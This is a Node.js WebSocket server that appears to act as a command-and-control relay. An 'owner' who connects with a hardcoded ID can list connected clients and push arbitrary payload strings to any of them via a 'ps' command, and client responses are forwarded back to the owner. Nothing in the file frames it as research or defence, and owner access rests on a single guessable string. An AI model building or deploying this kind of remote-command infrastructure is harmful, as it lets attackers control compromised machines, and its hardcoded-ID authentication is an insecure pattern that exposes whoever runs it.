const WebSocket = require('ws');
const fs = require('fs');

// Configuration
const wss = new WebSocket.Server({ port: 9002 });
const OWNER_ID = "Owotsuki";
const LOG_FILE = 'server.log';

let clients = {};

function logMessage(message) {
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] ${message}\n`;

    console.log(logEntry);

    fs.appendFile(LOG_FILE, logEntry, (err) => {
        if (err) {
            console.error(`Error writing in logs: ${err.message}`);
        }
    });
}

function handleOwnerCommands(ws, message) {
    const parts = message.split(' ');
    const command = parts[0];

    if (command === 'ps' && parts[1]) {
        const targetClientId = parts[1];
        const payload = parts.slice(2).join(' ');
        if (clients[targetClientId]) {
            clients[targetClientId].send(payload);
            ws.send(`Command sent to client ${targetClientId}.`);
            logMessage(`Owner sent command to ${targetClientId}: ${message}`);
        } else {
            ws.send(`Client with ID ${targetClientId} not found.`);
        }
    } else if (command === 'clientlist') {
        const clientIds = Object.keys(clients);

        ws.send(`Connected clients list: ${clientIds.join(', ')}`);
        logMessage(`Owner requested client list: ${clientIds.join(', ')}`);
    } else {
        ws.send('Invalid command or incorrect format.');
    }
}

wss.on('connection', (ws) => {
    logMessage('New client connected');

    // Handle errors gracefully
    ws.on('error', (err) => {
        console.error(`WebSocket error: ${err.message}`);
        logMessage(`WebSocket error: ${err.message}`);
    });

    ws.on('message', (message) => {
        try {
            message = message.toString().trim();

            if (!ws.clientId) {
                if (message === OWNER_ID) {
                    ws.isOwner = true;
                    ws.clientId = message;
                    clients[message] = ws;
                    ws.send(`
___________           __   .__ 
\\__    ___/_______ __|  | _|__|
  |    | /  ___/  |  \\  |/ /  |
  |    | \\___ \\|  |  /    <|  |
  |____|/____  >____/|__|_ \\__|
             \\/           \\/    
`);
                    logMessage('The owner is here.');
                } else if (message !== OWNER_ID && !clients[message]) {
                    ws.clientId = message;
                    clients[message] = ws;
                    //ws.send(`002`);
                    logMessage(`New client logged as: ${message}`);
                } else {
                    logMessage(`Unexpected intent ID: ${message}`);
                }
            } else {
                if (ws.isOwner) {
                    handleOwnerCommands(ws, message);
                } else {
                    if (message.startsWith('response')) {
                        const logEntry = `Client ${ws.clientId}: ${message}`;
                        logMessage(logEntry);

                        if (clients[OWNER_ID]) {
                            clients[OWNER_ID].send(logEntry);
                        }
                    } else {
                        logMessage(`Client tried to send message "${message}" from "${ws.clientId}"`);
                    }
                }
            }
        } catch (err) {
            console.error(`Error processing message: ${err.message}`);
            logMessage(`Error processing message from ${ws.clientId}: ${err.message}`);
        }
    });

    ws.on('close', () => {
        try {
            if (ws.clientId) {
                delete clients[ws.clientId];
                logMessage(`Client ${ws.clientId} disconnected`);
            }
        } catch (error) {
            logMessage(`Error handling client disconnection: ${error.message}`);
        }
    });
});

logMessage('WebSocket server listening on port 9002...');
